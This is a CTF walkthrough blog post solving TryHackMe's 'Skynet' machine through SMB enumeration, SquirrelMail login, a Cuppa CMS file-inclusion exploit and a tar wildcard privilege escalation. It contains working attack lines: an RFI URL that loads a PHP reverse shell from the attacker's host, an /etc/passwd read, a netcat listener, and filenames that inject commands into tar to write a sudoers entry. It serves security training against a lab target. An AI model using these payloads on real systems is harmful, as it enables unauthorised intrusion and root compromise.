<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Skynet TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/skynet-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-06-16T18:10:54+00:00">June 16, 2021</time><time class="updated" datetime="2025-06-10T20:06:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Skynet”. It is available at TryHackMe for penetration testing practice. The challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The breakdown of the Machine with the redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning </strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating HTTP service</span></li>
<li><span style="color: #000000;">Enumerating SMB service</span></li>
<li><span style="color: #000000;">Getting files from Anonymous Login</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Enumerating the Squirrel Mail instance</span></li>
<li><span style="color: #000000;">Getting the SMB share password</span></li>
<li><span style="color: #000000;">Enumerating SMB service</span></li>
<li><span style="color: #000000;">Getting web directory</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Enumerating Cuppa CMS</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Getting exploit from Searchsploit</span></li>
<li><span style="color: #000000;">Reading the LFI/RFI Exploit</span></li>
<li><span style="color: #000000;">Reading /etc/passwd file using LFI</span></li>
<li><span style="color: #000000;">Exploiting RFI to get a shell as www-data</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Backup Files</span></li>
<li><span style="color: #000000;">Exploiting Linux Wildcard</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">There are 2 flags in this machine to discover. After Booting up the target machine from the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/room/skynet">TryHackMe: Skynet CTF Page</a></strong></span>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.61.86</strong></span></p>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<p><span style="color: #000000;">We will start a nmap scan with the -sC for Default Scripts and -sV for Scanning Versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.61.86</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nkKm4HMZrpo/YMo0LREDREI/AAAAAAAAwc4/p6_t0JhT2fIxXHP2KmwedHc04IYgdLIawCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">We have a bunch of services running on the target machine. We have the 22 (SSH), 80 (HTTP), 110 (POP3), 139/445 (SMB), 143 (IMAP).</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We cannot enumerate SSH since we lack the credentials. Similarly, there seems to be a Mail Server setup that cannot be accessed from here. That leaves us with SMB and HTTP. We will begin our enumeration with HTTP.  We see that there is a website loaded that looks like a search engine. We tried to tinker around with it but there wasn’t much to go on.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NniF-sQdecY/YMo6iMZFVeI/AAAAAAAAwdA/gI6pZZvRax8ceBj40wkiBIS16F_PtboNgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">This meant we need to focus on SMB service for any further enumeration. We connected to the SMB service using the smbclient. We found two shares on the machine. Anonymous and Miles Dyson.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 10.10.61.86</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kXpTfyPcuM8/YMo69q8043I/AAAAAAAAwdI/pV2iMwVPnsY1pLBy0HKwAPX0Cv7aWbIWQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Since Miles Dyson requires credentials, we tried to connect to the Anonymous share. After connecting to the share, we see that there is a text file by the name of attention.txt and a directory by the name of logs. In the logs directory, there were three text files containing 3 log files. We downloaded all the text files back to our local machine to observe them.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.10.61.86/anonymous  
ls
get attention.txt
cd logs
ls
get log1.txt
get log2.txt
get log3.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FpdxBjt9DYw/YMo7BLCNgqI/AAAAAAAAwdM/PHa0KRiScw0TFpCtRcNAgD-RDqXkU46lwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">The attention.txt file reads that there has been a recent system malfunction that caused various passwords to be changed. It requests all the employees to change their passwords. The log files log2 and log3 were empty and log1 contains a list of possible passwords related to the Terminator Movie Franchise.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat attention.txt
cat log1.txt   
cat log2.txt
cat log3.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B29TYoQLzZY/YMo7E9_cWoI/AAAAAAAAwdQ/aIh99KXXlxcTSWNjG9ufXCs3f-BBahwHQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Another step for enumeration is to perform a Directory Bruteforce. We used the dirb tool for performing the directory Bruteforce. We found a SquirrelMail directory. There is a possibility that the Mail service that we detected at the beginning from nmap might be a SquirrelMail instance.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.61.86</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s0ieCR1Z4p4/YMo7K03N1rI/AAAAAAAAwdU/GvkOsO13xCEZgE1BfVasHt7PFTs_qJnHgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Opening the directory on the web browser we see that it was redirected to the Login page. Before trying a bunch of other options that can be used to Bruteforce the login, we tried to enter a bunch of default credentials and then eventually the username milesdyson and the password cyborg007haloterminator. This was the first password inside the log1.txt file that we acquired earlier.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86/squirrelmail/
Username: milesdyson
Password: cyborg007haloterminator</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-ZC6b_sIKcOI/YMo7T0Tg0UI/AAAAAAAAwdc/ZVAtyMkPEMgzZ78SQDZJJHyfVrF16R_zACLcBGAsYHQ/s16000/7.png"/></strong></span></p>
<p><span style="color: #000000;">After looking for mails inside the Inbox and Sent Box, we were able to procure the following mail. It says that the password for the milesdyson user has been changed after the malfunction. It gives us the updated password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Password: )s{A&amp;2Z=F^n_E.B`</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vZVWfeDDtrk/YMo7X-YYtbI/AAAAAAAAwdk/mn5F-Zvz0-o8NMcoFiX7FWoidf9dJ5vFwCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Since we have the password for the private share of the milesdyson, we can use it to enumerate his files shared over SMB. We again use the smbclient to access milesdyson share. Among some pdfs about neural networks and AI, we found a directory by the name of notes. Inside the notes directory, we found some markdown files. Among them was a text file by the name of improtatnt.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //10.10.61.86/milesdyson -U milesdyson
)s{A&amp;2Z=F^n_E.B`
ls
cd notes
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dd_DaIlGRqw/YMo7deyJGOI/AAAAAAAAwdo/oGVMyKnqd1cJeJ23Bmn-Fo8Ce1jj4QjJQCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">The markdown files seemed to be the basic notes but the important file seemed to the text file. We transferred the file to our local machine. Upon reading we see that a directory is mentioned among other things in the to-do list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">get important.txt
cat important.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tdQEa02KtZM/YMo7h6AKT0I/AAAAAAAAwds/Bu6sgh2QNj0QoI75E996XP1OmB2o-pJqwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We open the directory mentioned in the important.txt on our web browser and we found ourselves Miles Dyson Character’s picture and a brief introduction. He is the inventor/creator of Skynet. The AI that takes over mankind in Terminator Movie Franchise.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86/45kra24zxs28v3yd/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RZJavDaW5Vs/YMo7mR4RM8I/AAAAAAAAwd0/k7wBotbWZc4mcxaFLrDVQt5SlXIwxi5ZgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Since we couldn’t find any more clues or files in the directory by ourselves, we decided to perform a directory Bruteforce inside this newly founded directory. We found an administrator directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.61.86/45kra24zxs28v3yd/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f4f1GkhaGww/YMo7qKzDInI/AAAAAAAAwd8/J3SgNKtTe_oeT8ZLNo9ZgFfeiqDdfKINACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Upon opening the administrator directory in the web browser, we see that it is an instance of Cuppa CMS. We are greeted with a login panel.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86/45kra24zxs28v3yd/administrator/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ruSl5iFFB98/YMo7vfNqjVI/AAAAAAAAweE/fzcvq4OnVIgo8WWcZlCf8El_WS3SpvIYQCLcBGAsYHQ/s16000/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">From our previous encounter with the Cuppa CMS in the <a style="color: #000000;" href="https://www.hackingarticles.in/digitalworld-local-bravery-vulnhub-walkthrough/">Digital World Local Bravery Vulnhub Walkthrough</a>, we know that it is vulnerable to a Local File Inclusion Attack. We open searchsploit and search for the exploit in CMS. After locating the exploit, we download the exploit text file to our local machine to take a closer look.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit cuppa
searchsploit -m 25971.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RrhkgqgMyWU/YMo71aAZMoI/AAAAAAAAweM/N5G37ZKGM_UndELq54hkZxMgvRiQNRLFQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Reading the text file for the exploit, we see that it is possible to read the Local files on the target machine by targeting the urlConfig parameter in the alertConfigField.php. The best part is that it doesn’t even warrant a login into the CMS.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 25971.txt 
http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-atiDE34kgUg/YMo75QJblnI/AAAAAAAAweU/6neHNjucDNA4TBTDg_yIse6J3W-ZTA5_QCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We craft the URL to suit the IP Address of our target machine and see that we can read the /etc/passwd file on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nkLaPmCQWDE/YMo79-r4SCI/AAAAAAAAweY/rtWo6XTt7VIWvBuAoBrXocCkwJ8PENkuACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">From the text file of the exploit and the result of searchsploit, we know that it is possible to include a remote file similarly. This means that the CMS is vulnerable to the Remote File Inclusion attack as well. This will help as we will use the php reverse shell file that is found in Kali Linux and point at it through the target machine to exploit the RFI to get a shell on the target machine. We edited the php reverse shell file to include our local (VPN) IP Address and then used the python HTTP server one-liner to host the file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano php-reverse-shell.php
python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KO_0NmQG2ss/YMo8Cs_psDI/AAAAAAAAwec/NFZn6I3D7_Av2f-gFjgZTA_3JVtTB6HoQCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">We changed the IP address in the URL to accommodate the address of the now hosted php reverse shell.  Before executing the exploit, we first need to create a Netcat listener on the port mentioned in the php reverse shell file. By default, it is 1234. Then execute the payload through the web browser as depicted below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.61.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.110.53:8000/php-reverse-shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1KJf12UL3dU/YMo8H3sbP5I/AAAAAAAAwek/2otsxEcCbE0x2NZ6ni7btvWORs93VPTggCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">As soon as the exploit is executed, we get a shell on our Netcat listener. We use the id command to check the user and group details and found that the shell that we have procured is for the user www-data.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MzSgNcI12jk/YMo8OMYs5NI/AAAAAAAAwes/YQMVv8AYc1gRuydTkBRqKKmTSdRVCz57gCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We move to the home directory to see what are various users created on the target machine. We see that there is a single user by the name of milesdyson. We found the user flag inside its home directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
ls
cd milesdyson
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qb-p4Peo5dM/YMo8V52RGSI/AAAAAAAAwe0/qjWNNuDbkbIBddS6Mn05IAa1TOz6OamTgCLcBGAsYHQ/s16000/20.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">While looking for the user flag, we see that there is a backups directory inside the milesdyson home directory. Traversing inside, we see that it has a shell script by the name of the backup.sh. Reading the shell file, we see that it contains a * wildcard. As covered by our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">Exploiting Wildcard for Privilege Escalation Article</a></strong></span>, we need to check the /etc/crontab file. We see that the backup shell script is scheduled to execute at intervals of 1 minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd backups
ls -la
cat backup.sh
cat /etc/crontab</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-OFNzdOrOw08/YMo8arkl6XI/AAAAAAAAwe4/rL76ae9CoZsP7grSF6oj2J_X43nOYzAowCLcBGAsYHQ/s16000/21.png"/></strong></span></p>
<p><span style="color: #000000;">There were multiple methods to get root from this vulnerability, we decided to use it to grant the sudoers permission instead of getting another shell. So, we moved to the directory that is being backed up and then created another shell script by the name of pavan.sh and entered the command inside it using echo. Then we proceeded to enter the checkpoint that will run the shell command when the tar will be backing up the directory. Using the sudo -l command we saw that the sudoers entry has been made. We just use the sudo bash command to get the root shell. We read the root flag to conclude the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; pavan.sh
echo "/var/www/html"  &gt; "--checkpoint-action=exec=sh pavan.sh"
echo "/var/www/html"  &gt; --checkpoint=1
sudo -l
sudo bash
cat /root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I6sxp9SVXTE/YMo8i1NssfI/AAAAAAAAwfA/br93DGIDEksbLVAobLY9JRRW7YYVAgKlACLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
